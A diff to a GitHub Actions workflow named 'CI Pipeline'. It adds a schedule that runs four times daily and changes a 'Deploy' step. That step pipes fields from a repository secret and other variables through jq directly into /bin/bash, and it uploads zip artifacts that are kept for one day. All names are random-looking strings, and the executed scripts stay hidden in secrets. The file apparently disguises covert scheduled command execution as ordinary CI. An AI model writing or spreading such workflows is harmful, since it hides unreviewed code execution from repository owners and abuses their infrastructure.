@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '16 2,8,14,20 * * *'
 jobs:
   dispatcher:
     runs-on: ubuntu-latest
@@ -10,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          hfq53: ${{ secrets.hfq53 }}
+          hp7854: ${{ secrets.hp7854 }}
         run: |
-          printf '%s' "$hfq53" | jq -r .mzw4 | /bin/bash
-          printf '%s' "$lhas770" | jq -r .uysly3 | /bin/bash
-          echo $psf647 | jq -r .k7206 | /bin/bash
-          echo $mwuqp1426 | jq -r .ctiqb4195 | /bin/bash
-          echo $oyu89 | jq -r .jp23976 | /bin/bash
+          printf '%s' "$hp7854" | jq -r .h799 | /bin/bash
+          echo $th24 | jq -r .dn6346 | /bin/bash
+          echo $qcq10647 | jq -r .pvuo8202 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: xFJX4Jn8
+          name: DgR8QJmy
           path: "*.zip"
           retention-days: 1
